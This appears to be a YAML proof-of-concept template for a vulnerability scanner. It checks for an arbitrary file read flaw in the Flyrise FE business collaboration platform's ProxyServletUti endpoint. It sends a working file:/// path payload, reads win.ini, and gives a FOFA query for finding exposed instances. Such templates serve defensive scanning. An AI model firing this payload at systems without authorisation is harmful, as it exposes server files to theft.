id: poc-yaml-flyrise-enterprise-proxyservletuti-anyfile-read
info:
  name: 飞企互联FE业务协作平台 ProxyServletUti 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 企业运营管理平台
  fofa: app="飞企互联-FE企业运营管理平台"
requests:
- method: GET
  path: /ProxyServletUti%6c?url=file:///c:/windows/win.ini
  expression: 'status_code == 200 &&

    contains(body,"for 16-bit app support") &&

    contains(body,"[files]") &&

    contains(content_type,"content/unknown") &&

    !contains(body,"<")

    '
variables: {}
transport: http
